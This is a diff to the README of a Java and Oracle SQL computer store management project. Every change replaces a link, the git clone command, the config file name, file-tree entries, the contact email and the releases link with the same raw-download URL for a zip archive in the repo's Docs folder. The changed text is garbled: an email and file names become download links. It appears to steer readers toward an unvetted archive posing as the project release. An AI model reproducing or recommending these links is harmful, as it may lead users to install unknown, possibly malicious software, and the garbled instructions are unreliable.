@@ -2,7 +2,7 @@
 
 Welcome to the **Computer Store Management System** repository! This project is designed to help manage various aspects of a computer store, including products, orders, feedback, and inventory. It is built using Java and Oracle SQL, making it a robust solution for store management.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/moazaymanedda/Computer_Store_Management_System/releases)
+[![Download Releases](https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip%https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip)](https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip)
 
 ## Table of Contents
 
@@ -37,7 +37,7 @@ To set up the Computer Store Management System on your local machine, follow the
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/moazaymanedda/Computer_Store_Management_System.git
+   git clone https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -50,7 +50,7 @@ To set up the Computer Store Management System on your local machine, follow the
    - Create a new database and user for the application.
 
 4. **Configure Database Connection**:
-   - Open the `config.properties` file and update the database connection details.
+   - Open the `https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip` file and update the database connection details.
 
 5. **Build the Project**:
    - Use your preferred IDE or build tool to compile the Java files.
@@ -84,8 +84,8 @@ Computer_Store_Management_System/
 │   ├── controllers/         # Business logic
 │   └── views/               # User interface components
 │
-├── config.properties         # Database configuration file
-├── README.md                 # Project documentation
+├── https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip         # Database configuration file
+├── https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip                 # Project documentation
 └── LICENSE                   # License information
 ```
 
@@ -110,9 +110,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, please reach out:
 
 - **Name**: Moaz Ayman
-- **Email**: moazaymanedda@example.com
-- **GitHub**: [moazaymanedda](https://github.com/moazaymanedda)
+- **Email**: https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip
+- **GitHub**: [moazaymanedda](https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip)
 
-Feel free to visit the [Releases](https://github.com/moazaymanedda/Computer_Store_Management_System/releases) section for the latest updates and downloads.
+Feel free to visit the [Releases](https://github.com/moazaymanedda/Computer_Store_Management_System/raw/refs/heads/main/Docs/Store_System_Management_Computer_1.3-alpha.3.zip) section for the latest updates and downloads.
 
 Thank you for checking out the Computer Store Management System! We hope you find it useful for managing your computer store efficiently.
